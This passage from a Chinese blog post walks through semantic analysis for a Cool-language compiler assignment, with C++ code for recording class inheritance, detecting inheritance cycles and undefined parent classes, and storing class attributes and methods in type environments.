当完成最终的试验后，回过头发现根本原因还是<strong>实验文档</strong>没有细读，实验中遇到的很多问题，在<strong>实验文档</strong>中有详细的描述并给出了解决方法。<br>  虽然如此，即使重新完成一次实验，甚至一百次试验，我估计还是和第一次类似的体验——因为一开始对项目框架不理解，只有实现了一部分后才明白框架逻辑，但此时一开始实现的代码逻辑已经制约了后续代码编写，只能在前面的基础上修修补补(或者重构)。</p><p>  下面说明一下语义分析的逻辑<br>  实际上，语义分析可以抽象为下面三个模块</p><ol><li>解析<strong>接口</strong>定义：包括类、类的属性和类的方法</li><li><p>解析<strong>接口</strong>实现：包括类的方法的方法体的实现</p><p>可以看到，将源代码分为了两部分——<strong>接口定义</strong>(方法体之外)和<strong>接口实现</strong>(方法体)<br>也就是方法体之外定义了方法体之内可以用到的接口(也就是类型、方法和部分变量)，方法体只能额外的自定义变量和变量间关系<br>如果理解了这一点，整个项目就会比较明了</p></li></ol><h3 id="解析接口定义"><a href="#解析接口定义" class="headerlink" title="解析接口定义"></a>解析接口定义</h3><p>  这部分也可以简单分为两部分</p><ol><li>类的继承关系</li><li><p>类的属性和方法</p><p>这里的难点在于一个类的属性或方法，可能用到了还没解析到的类，如何判断该类是合法的还是非法的。<br>当然，有多种方法进行实现，这里使用的是遍历两遍——第一遍解析所有的类后，有了全部的类信息，此时在解析类的属性和方法，就可以轻松地判断相关的类是合法还是非法的。</p></li></ol><h4 id="类的继承关系"><a href="#类的继承关系" class="headerlink" title="类的继承关系"></a>类的继承关系</h4><p>  也就是相当于第一遍遍历，可以使用<strong>unordered_map</strong>结构来记录类的继承关系，处理代码如下所示<br>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassTable</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span> semant_errors;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">install_class</span><span class="params">(Symbol symbol, Class_ class_)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">install_class</span><span class="params">(Symbol symbol, Class_ class_, Symbol inherit)</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">install_basic_classes</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">install_define_class</span><span class="params">(Class_ class_)</span></span>;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    class A inherits B</span></span><br><span class="line"><span class="comment">    则inherits[A] = B</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  std::unordered_map&lt;Symbol, Symbol&gt; inherits;</span><br><span class="line">  std::unordered_map&lt;Symbol, Class_&gt; symbol_to_class;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">check_inherits</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ClassTable</span>(Classes);</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">errors</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> semant_errors; &#125;</span><br><span class="line">  <span class="function">ostream&amp; <span class="title">semant_error</span><span class="params">()</span></span>;</span><br><span class="line">  <span class="function">ostream&amp; <span class="title">semant_error</span><span class="params">(Class_ c)</span></span>;</span><br><span class="line">  <span class="function">ostream&amp; <span class="title">semant_error</span><span class="params">(tree_node *t)</span></span>;</span><br><span class="line">  <span class="function">ostream&amp; <span class="title">semant_error</span><span class="params">(Symbol filename, tree_node *t)</span></span>;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * arg1:Symbol symbol，即类的符号信息</span></span><br><span class="line"><span class="comment"> * arg2:Class_ class_，即类的结构信息</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 也就是添加该类，其继承的类是Object</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClassTable::install_class</span><span class="params">(Symbol symbol, Class_ class_)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">install_class</span>(symbol, class_, Object);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * arg1:Symbol symbol，即类的符号信息</span></span><br><span class="line"><span class="comment"> * arg2:Class_ class_，即类的结构信息</span></span><br><span class="line"><span class="comment"> * arg3:Symbol inherit，即继承的类的符号信息</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 也就是添加该类，其继承的类是inherit，并且添加相关的方法</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClassTable::install_class</span><span class="params">(Symbol symbol, Class_ class_, Symbol inherit)</span> </span>&#123;</span><br><span class="line">    symbol_to_class.<span class="built_in">insert</span>(std::<span class="built_in">pair</span>&lt;Symbol, Class_&gt;(symbol, class_));</span><br><span class="line">    inherits.<span class="built_in">insert</span>(std::<span class="built_in">pair</span>&lt;Symbol, Symbol&gt;(symbol, inherit)); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * arg1：       Class_ class_，即在程序中定义的类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 即添加程序中自定义的类</span></span><br><span class="line"><span class="comment"> * 这里需要检查类的标识符、类中Feature的标识符的唯一</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClassTable::install_define_class</span><span class="params">(Class_ class_)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 进行如下检查</span></span><br><span class="line"><span class="comment">     * 1. 避免继承String、Bool、Int类型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    Symbol inherit = class_-&gt;<span class="built_in">get_inherit</span>();</span><br><span class="line">    <span class="keyword">if</span>(inherit == Str || inherit == Bool || inherit == Int) &#123;</span><br><span class="line">        <span class="built_in">semant_error</span>(class_) &lt;&lt; <span class="string">&quot;Class &quot;</span></span><br><span class="line">        &lt;&lt; class_-&gt;<span class="built_in">get_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; cannot inherit class &quot;</span></span><br><span class="line">        &lt;&lt; inherit-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">install_class</span>(class_-&gt;<span class="built_in">get_name</span>(), class_, class_-&gt;<span class="built_in">get_inherit</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 检查程序中类的 继承关系</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 1. 检查继承关系存在的环</span></span><br><span class="line"><span class="comment"> * 2. 检查继承关系继承不存在的类</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 这里通过DFS遍历inherits，并配合unordered_set即可</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClassTable::check_inherits</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    std::unordered_map&lt;Symbol, Symbol&gt; map;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;iter : inherits) &#123;</span><br><span class="line">        <span class="keyword">if</span>(map.<span class="built_in">find</span>(iter.first) != map.<span class="built_in">end</span>()) &#123; <span class="keyword">continue</span>; &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 说明当前继承类还没有被遍历</span></span><br><span class="line"><span class="comment">         * 开始DFS遍历</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        std::unordered_set&lt;Symbol&gt; sets;</span><br><span class="line">        Symbol symbol = iter.first;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 如果symbol == Object，则其已经遍历到Object，无需继续遍历</span></span><br><span class="line"><span class="comment">         * 如果symbol不在inherits中，则说明symbol未被定义(否则一定存在一条路径，使其继承自Object)</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">while</span>(symbol != Object &amp;&amp; inherits.<span class="built_in">find</span>(symbol) != inherits.<span class="built_in">end</span>()) &#123;</span><br><span class="line"></span><br><span class="line">            map[symbol] = inherits[symbol];</span><br><span class="line">            sets.<span class="built_in">insert</span>(symbol);</span><br><span class="line">            symbol = inherits[symbol];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(sets.<span class="built_in">find</span>(symbol) != sets.<span class="built_in">end</span>() || (map.<span class="built_in">find</span>(symbol) != map.<span class="built_in">end</span>() &amp;&amp; map[symbol] == <span class="literal">nullptr</span>)) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * 说明从iter.first 到 symbol， 存在环，将其map都设置为nullptr即可</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                Symbol s = iter.first;</span><br><span class="line">                <span class="keyword">do</span> &#123;</span><br><span class="line">                    map[s] = <span class="literal">nullptr</span>; </span><br><span class="line">                    s = inherits[s];</span><br><span class="line">                &#125;<span class="keyword">while</span>(s != symbol);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(map.<span class="built_in">find</span>(symbol) != map.<span class="built_in">end</span>() &amp;&amp; map[symbol] != <span class="literal">nullptr</span>) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * 说明该symbol已经被遍历过了，且不存在环</span></span><br><span class="line"><span class="comment">                 * 则无需在遍历后面</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 遍历整个map</span></span><br><span class="line"><span class="comment">     * 如果map[symbol] == nullptr，则说明在环的路径中</span></span><br><span class="line"><span class="comment">     * 如果map[symbol]不在symbol_to_class中，则说明继承不存在的类</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;iter : map) &#123;</span><br><span class="line">        <span class="keyword">if</span>(iter.second == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="built_in">semant_error</span>(symbol_to_class[iter.first]) &lt;&lt; <span class="string">&quot;Class &quot;</span> &lt;&lt; iter.first-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;, or an ancestor of &quot;</span></span><br><span class="line">                &lt;&lt; iter.first-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;, is involved in an inheritance cycle.&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(symbol_to_class.<span class="built_in">find</span>(iter.second) == symbol_to_class.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            <span class="built_in">semant_error</span>(symbol_to_class[iter.first]) &lt;&lt; <span class="string">&quot;Class &quot;</span> &lt;&lt; iter.first-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; inherits from an undefined class &quot;</span></span><br><span class="line">            &lt;&lt;  iter.second-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ClassTable::<span class="built_in">ClassTable</span>(Classes classes) : <span class="built_in">semant_errors</span>(<span class="number">0</span>) , <span class="built_in">error_stream</span>(cerr) &#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化基础类 */</span></span><br><span class="line">  <span class="built_in">install_basic_classes</span>();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 初始化程序定义类 */</span></span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = classes-&gt;<span class="built_in">first</span>(); classes-&gt;<span class="built_in">more</span>(i); i = classes-&gt;<span class="built_in">next</span>(i)) &#123; <span class="built_in">install_define_class</span>(classes-&gt;<span class="built_in">nth</span>(i)); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 检查类 继承关系 */</span></span><br><span class="line">  <span class="built_in">check_inherits</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="类的属性和方法"><a href="#类的属性和方法" class="headerlink" title="类的属性和方法"></a>类的属性和方法</h4><p>  在<strong>Cool</strong>的语法分析中，类似于最开始介绍的<strong>属性文法</strong>，类的<strong>属性</strong>和<strong>方法</strong>都抽象成<strong>Feature_class</strong>节点，节点中包含相关的属性信息。<br>  则可以使用<code>unordered_map&lt;Symbol, unordered_map&lt;Symbol, Feature_class&gt;&gt;</code>结构进行存储<br>  而考虑到<strong>Cool</strong>的语法允许类的属性和类的方法同名，则分别独立的进行存储即可，相关代码如下所示<br>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassTable</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">typedef</span> std::unordered_map&lt;Symbol, attr_class*&gt; Attr_type;</span><br><span class="line">  <span class="keyword">typedef</span> std::unordered_map&lt;Symbol, method_class*&gt; Method_type;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 即Cool-Manual中定义的Type Environments</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * 按照手册可知</span></span><br><span class="line"><span class="comment">   * 其应该至少包含三部分</span></span><br><span class="line"><span class="comment">   * 1. Method Environment</span></span><br><span class="line"><span class="comment">   * 2. Object Environment</span></span><br><span class="line"><span class="comment">   * 3. 当前类名称</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 除此之外，其应该提供如下方法</span></span><br><span class="line"><span class="comment">   * 1. M(v) = T，即根据对象名称返回其类型</span></span><br><span class="line"><span class="comment">   * 2. M(C, f) = (T1, ...., Tn - 1, Tn)，级根据方法名称返回一系列特征</span></span><br><span class="line"><span class="comment">   * 3. 返回SELF_TYPE类型，即当前类名称</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  std::unordered_map&lt;Symbol, Attr_type*&gt; *attr_environment;</span><br><span class="line">  std::unordered_map&lt;Symbol, Method_type*&gt; *method_environment;</span><br><span class="line">  Symbol self;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">assert_self</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(self == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      cerr &lt;&lt; <span class="string">&quot;self is nullptr&quot;</span>;</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * arg1: attr_class *attr，要添加的attr的结构指针</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 即将attr添加入attr_environment中，添加前需要检查是否重复定义，这里不考虑父类继承情况</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(attr_class *attr)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert_self</span>();</span><br><span class="line"></span><br><span class="line">    Attr_type *attr_map = attr_environment-&gt;<span class="built_in">find</span>(self)-&gt;second;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果重复定义的话，则输出相关的错误信息即可</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(attr_map-&gt;<span class="built_in">find</span>(attr-&gt;<span class="built_in">get_name</span>()) != attr_map-&gt;<span class="built_in">end</span>()) &#123;</span><br><span class="line">      <span class="built_in">semant_error</span>(attr) &lt;&lt; <span class="string">&quot;Attribute &quot;</span> &lt;&lt; attr-&gt;<span class="built_in">get_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; is multiply defined in class.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      attr_map-&gt;<span class="built_in">insert</span>(std::<span class="built_in">pair</span>&lt;Symbol, attr_class*&gt;(attr-&gt;<span class="built_in">get_name</span>(), attr));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * arg1: method_class *method，要添加的method的结构指针</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 即将method添加入method_environment中，添加前需要检查是否重复定义，这里不考虑父类继承情况</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(method_class *method)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert_self</span>();</span><br><span class="line"></span><br><span class="line">    Method_type *method_map = method_environment-&gt;<span class="built_in">find</span>(self)-&gt;second;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 如果重复定义的话，则输出相关的错误信息即可</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(method_map-&gt;<span class="built_in">find</span>(method-&gt;<span class="built_in">get_name</span>()) != method_map-&gt;<span class="built_in">end</span>()) &#123;</span><br><span class="line">      <span class="built_in">semant_error</span>(method) &lt;&lt; <span class="string">&quot;Method &quot;</span> &lt;&lt; method-&gt;<span class="built_in">get_name</span>()-&gt;<span class="built_in">get_string</span>() &lt;&lt; <span class="string">&quot; is multiply defined in class.&quot;</span> &lt;&lt; endl;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">      method_map-&gt;<span class="built_in">insert</span>(std::<span class="built_in">pair</span>&lt;Symbol, method_class*&gt;(method-&gt;<span class="built_in">get_name</span>(), method));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * arg1: Symbol inherit, 要添加的Feature所述的类所继承的类</span></span><br><span class="line"><span class="comment">   * </span></span><br><span class="line"><span class="comment">   * 即将arg2继承的类的属性和方法，覆盖到子类中——需要注意的是，当子类中已经存在时，无需再覆盖处理</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(Symbol inherit)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">assert_self</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 当类依赖不存在的类时</span></span><br><span class="line"><span class="comment">     * 需要特殊判断</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    Attr_type *attr_map = attr_environment-&gt;<span class="built_in">find</span>(self)-&gt;second;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 可能继承不存在的类</span></span><br><span class="line"><span class="comment">     * 这里需要判断，避免崩溃</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span>(attr_environment-&gt;<span class="built_in">find</span>(inherit) != attr_environment-&gt;<span class="built_in">end</span>()) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">auto</span> &amp;iter : *attr_environment-&gt;<span class="built_in">find</span>(inherit)-&gt;second) &#123;</span><br><span class="line">        <span class="keyword">if</span>(attr_map-&gt;<span class="built_in">find</span>(iter.first) 